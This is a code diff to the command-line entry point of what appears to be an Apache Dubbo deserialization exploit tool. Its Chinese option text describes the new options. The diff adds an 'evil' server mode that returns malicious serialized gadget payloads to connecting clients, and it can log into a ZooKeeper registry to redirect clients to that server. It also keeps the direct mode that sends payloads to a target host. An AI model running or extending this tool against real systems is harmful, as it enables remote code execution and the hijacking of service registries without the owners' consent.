@@ -1,6 +1,7 @@
 package com.threedr3am.exp.dubbo;
 
 import com.threedr3am.exp.dubbo.fastcheck.CheckDataCenter;
+import com.threedr3am.exp.dubbo.fastcheck.CheckParams;
 import com.threedr3am.exp.dubbo.payload.Payload;
 import com.threedr3am.exp.dubbo.payload.Payloads;
 import com.threedr3am.exp.dubbo.protocol.Protocol;
@@ -25,6 +26,15 @@ public class Main {
   public static void main(String[] args) throws ParseException {
     Options options = new Options()
         .addOption("h","help", false, "帮助信息")
+        .addOption("e","evil", false, "恶意服务模式，也就是通过返回恶意序列化数据给客户端，从而攻击连接进来的服务")
+        .addOption("evilHost", true, "恶意服务ip")
+        .addOption("evilPort", true, "恶意服务port")
+        .addOption("registry", true, "[zookeeper]，暂时仅实现了攻击zookeeper，恶意服务模式下，攻击注册中心，控制客户端连接到本恶意服务，也就是通过返回恶意序列化数据给客户端，从而攻击连接进来的服务")
+        .addOption("scheme", true, "[auth|digest]，zookeeper认证类型")
+        .addOption("username", true, "[zookeeperUsername]，zookeeper认证账号")
+        .addOption("password", true, "[zookeeperPassword]，zookeeper认证密码，digest：要对passWord进行MD5哈希，然后再进行bese64")
+        .addOption("registryURL", true, "zookeeper url，例：127.0.0.1:2181")
+        .addOption("w","wait", true, "等待客户端连接超时时间（毫秒，默认等待5秒），一般业务调用频繁的，瞬间就会连接进来，但是业务不频繁的，可能等很久")
         .addOption("t", "target", true, "目标，例：-t 127.0.0.1:20880")
         .addOption("s", "serialization", true, "[hessian|java] 序列化类型")
         .addOption("p", "protocol", true, "[dubbo|http] 通讯协议名称，默认缺省dubbo")
@@ -37,6 +47,17 @@ public class Main {
     //parser
     CommandLineParser parser = new DefaultParser();
     CommandLine cmd = parser.parse(options, args);
+
+    boolean evil = cmd.hasOption("evil");
+    String registry = cmd.hasOption("registry") ? cmd.getOptionValue("registry") : "";
+    String evilHost = cmd.hasOption("evilHost") ? cmd.getOptionValue("evilHost") : "";
+    int evilPort = cmd.hasOption("evilPort") ? Integer.parseInt(cmd.getOptionValue("evilPort")) : 23232;
+    long wait = cmd.hasOption("wait") ? Long.parseLong(cmd.getOptionValue("wait")) : 5000L;
+    String scheme = cmd.hasOption("scheme") ? cmd.getOptionValue("scheme") : "";
+    String username = cmd.hasOption("username") ? cmd.getOptionValue("username") : "";
+    String password = cmd.hasOption("password") ? cmd.getOptionValue("password") : "";
+    String registryURL = cmd.hasOption("registryURL") ? cmd.getOptionValue("registryURL") : "";
+
 
     String protocol = cmd.hasOption("protocol") ? cmd.getOptionValue("protocol") : "dubbo";
     String s = cmd.getOptionValue("serialization");
@@ -61,7 +82,7 @@ public class Main {
       return;
     }
 
-    if (!cmd.hasOption("target")) {
+    if (!evil && !cmd.hasOption("target")) {
       System.err.println("目标不能为空，例：-t 127.0.0.1:20880");
       return;
     }
@@ -78,7 +99,7 @@ public class Main {
           System.err.println("gadget[" + cmd.getOptionValue("gadget") + "]不存在");
           return;
         }
-        if (payloadEnum.getParamSize() != payloadArgs.length) {
+        if (payloadEnum.getCheckParam() != CheckParams.CMD && payloadEnum.getParamSize() != payloadArgs.length) {
           System.err.println("gadget参数错误");
           System.err.println(payloadEnum.getParamTis());
           return;
@@ -91,6 +112,22 @@ public class Main {
       }
     }
 
+    if (evil) {
+      byte[][] payload = new byte[payloadsList.size()][];
+      for (int i = 0; i < payloadsList.size(); i++) {
+        Payloads p = payloadsList.get(i);
+        Serialization serialization = Serializations.getSerialization(p.getSerialization());
+        serialization.setPayload(p.getPayload());
+        byte[] bytes = serialization.makeData(p.getPayload(), payloadArgs, protocol);
+
+        Protocol protocolImpl = Protocols.getProtocol(protocol);
+        Map<String, String> extraData = protocolImpl.initExtraData(cmd);
+        bytes = protocolImpl.makeData(bytes, serialization, extraData);
+        payload[i] = bytes;
+      }
+      new Exploit().evil(registryURL, scheme, username, password, evilHost, evilPort, registry != null && !registry.isEmpty(), payload, s, wait);
+      System.exit(1);
+    }
     for (Payloads p:payloadsList) {
       Serialization serialization = Serializations.getSerialization(p.getSerialization());
       serialization.setPayload(p.getPayload());
@@ -117,6 +154,7 @@ public class Main {
 
       new Exploit().attack(host, port, bytes);
     }
+    System.exit(1);
   }
 
 }
